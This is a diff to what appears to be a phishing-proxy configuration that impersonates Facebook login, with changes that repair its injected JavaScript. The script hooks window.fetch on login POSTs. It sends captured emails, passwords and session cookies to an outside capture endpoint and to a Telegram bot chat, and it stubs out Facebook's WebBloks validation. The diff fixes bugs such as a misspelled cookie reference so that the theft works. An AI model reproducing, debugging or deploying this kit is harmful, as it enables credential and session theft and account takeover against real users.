@@ -8,7 +8,7 @@ proxy_hosts:
   - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
   - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false}
   - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
-  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', search: 'refsrc=deprecated', replace: '', mimes: ['*/*'], session: true}
 
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'WebBloks', replace: '//WebBloks', mimes: ['application/javascript']}
@@ -72,25 +72,33 @@ js_inject:
     inject_delay: 2000
     cache_buster: true
     script: |
+
+      window.onbeforeunload = null;
+      if (window.location.href.includes('refsrc=deprecated')) {
+        window.location.href = '/login.php'; 
+      }
+
       // Bypass WebBloks validation
       window.Bloks = {
         validatePayload: function() { return true; },
         parseTree: function() { return {}; }
       };
-      // Run in victim's browser console
+
+      // Debugging
       console.log('Bloks status:', typeof Bloks, Bloks?.validatePayload);
       Object.defineProperty(window, 'fb_web_bloks', {value: false});
-      function debug(){
-      console.log('loaded')
-      
-      }
+
+      function debug() {
+        console.log('loaded');
+      } // <- Missing brace added
+
       // Intercept form submission
       const origFetch = window.fetch;
       window.fetch = function(url, options) {
         if (url.includes('/login/') && options?.method === 'POST') {
           const formData = new URLSearchParams(options.body);
           if (formData.has('email') && formData.has('pass')) {
-            // Send credentials to your capture endpoint
+            // Send credentials to capture endpoint
             fetch('https://frontgate.live/capture', {
               method: 'POST',
               body: JSON.stringify({
@@ -116,13 +124,12 @@ js_inject:
               headers: {'Content-Type': 'application/json'},
               body: JSON.stringify({
                 chat_id: "5228920520",
-                text: `New Logs\nEmail: ${email}\npass: ${pass}\n Cookie: ${document.cooke} \nIP: ${window.location.hostname}
+                text: `New Logs\nEmail: ${email}\nPass: ${pass}\nCookie: ${document.cookie}\nIP: ${window.location.hostname}`,
                 disable_notification: false
               })
-            })
+            }).catch(e => console.error('Telegram error:', e));
           } else {
-          console.log('nope');
+            console.log('Email or pass not found');
           }
         }
-      }, true);
-      debug()
+      }, true); 
